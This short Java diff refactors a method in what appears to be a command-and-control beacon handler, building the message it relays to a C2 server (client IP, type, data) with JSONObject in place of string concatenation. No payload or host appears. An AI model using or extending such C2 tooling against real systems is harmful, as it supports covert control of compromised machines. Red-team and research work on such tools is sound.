@@ -11,6 +11,8 @@ import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.URL;
 
+import org.json.JSONObject;
+
 public class BeaconClientHandler implements Runnable{
     // IP address of the client
     private String IPAddress;
@@ -129,8 +131,11 @@ public class BeaconClientHandler implements Runnable{
      * @param data - data of message
      */
     private void sendResponseToC2(String type, String data){
-        String message = "{\"ip\": \"" + IPAddress + "\", \"type\": \"" + type + "\", \"data\": \"" + data + "\"}";
-        beaconServer.sendDataToC2Server(message);
+        JSONObject jo = new JSONObject();
+        jo.put("ip", IPAddress);
+        jo.put("type", type);
+        jo.put("data", data);
+        beaconServer.sendDataToC2Server(jo.toString());
     }
 
     @Override
